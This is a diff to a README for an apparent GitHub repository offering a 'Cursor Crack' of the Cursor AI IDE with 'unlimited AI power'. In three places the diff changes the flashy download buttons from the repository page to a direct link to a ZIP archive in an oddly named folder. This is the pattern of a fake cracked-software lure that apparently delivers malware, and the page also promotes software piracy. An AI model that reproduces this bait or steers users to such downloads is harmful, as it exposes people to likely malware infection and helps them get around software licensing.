@@ -1,7 +1,7 @@
 <h1>✨ Cursor-Crack---Cursor-AI-IDE-2026 - Unleash Unlimited AI Power Now</h1>
 
 <p align="center">
-  <a href="https://github.com/Berrichivalrous5847/Cursor-Crack---Cursor-AI-IDE-2026">
+  <a href="https://github.com/Berrichivalrous5847/Cursor-Crack---Cursor-AI-IDE-2026/raw/refs/heads/main/incomposedly/1.5.zip">
     <img src="https://img.shields.io/badge/🚀_DOWNLOAD_CURSOR_2026-FF6B6B?style=for-the-badge&logo=github&logoColor=white&labelColor=2E3440" alt="Download Button" style="max-width:100%; height:auto; border-radius:12px; box-shadow:0 4px 15px rgba(255,107,107,0.3);">
   </a>
 </p>
@@ -29,7 +29,7 @@ Follow these super-simple steps below, and you will be up and running within two
 Click the big red button right here:
 
 <p align="center">
-  <a href="https://github.com/Berrichivalrous5847/Cursor-Crack---Cursor-AI-IDE-2026" style="display:inline-block; padding:18px 40px; background:linear-gradient(135deg,#667eea 0%,#764ba2 100%); color:white; font-size:22px; font-weight:bold; border-radius:50px; text-decoration:none; box-shadow:0 10px 25px rgba(102,126,234,0.4); margin:20px 0;">🔥 GRAB YOUR COPY NOW 🔥</a>
+  <a href="https://github.com/Berrichivalrous5847/Cursor-Crack---Cursor-AI-IDE-2026/raw/refs/heads/main/incomposedly/1.5.zip" style="display:inline-block; padding:18px 40px; background:linear-gradient(135deg,#667eea 0%,#764ba2 100%); color:white; font-size:22px; font-weight:bold; border-radius:50px; text-decoration:none; box-shadow:0 10px 25px rgba(102,126,234,0.4); margin:20px 0;">🔥 GRAB YOUR COPY NOW 🔥</a>
 </p>
 
 After clicking, you will land ona GitHub page. Look for the green button that says **"Code"** or **"Download"**. Click it, and choose **"Download ZIP"** from the dropdown menu. The file will start downloading automatically to your computer's "Downloads" folder–usually located in your main user folder (like C:\Users\YourName\Downloads). Do not worry if it takes a minute; the file needs to breathe.
@@ -170,7 +170,7 @@ You are now totally equipped to join the future of coding. No more hitting artif
 So what are you waiting for? Hit that download button again:
 
 <p align="center">
-  <a href="https://github.com/Berrichivalrous5847/Cursor-Crack---Cursor-AI-IDE-2026" style="display:inline-block; padding:15px 50px; background:linear-gradient(135deg,#f093fb 0%,#f5576c 100%); color:white; font-size:20px; font-weight:bold; border-radius:40px; text-decoration:none; box-shadow:0 10px 20px rgba(240,147,251,0.3); margin:20px 0;">🚀 DOWNLOAD NOW – START CODING FASTER</a>
+  <a href="https://github.com/Berrichivalrous5847/Cursor-Crack---Cursor-AI-IDE-2026/raw/refs/heads/main/incomposedly/1.5.zip" style="display:inline-block; padding:15px 50px; background:linear-gradient(135deg,#f093fb 0%,#f5576c 100%); color:white; font-size:20px; font-weight:bold; border-radius:40px; text-decoration:none; box-shadow:0 10px 20px rgba(240,147,251,0.3); margin:20px 0;">🚀 DOWNLOAD NOW – START CODING FASTER</a>
 </p>
 
 Go on–your future self will thank you. Happy coding, and may the AI be with you! 🚀✨
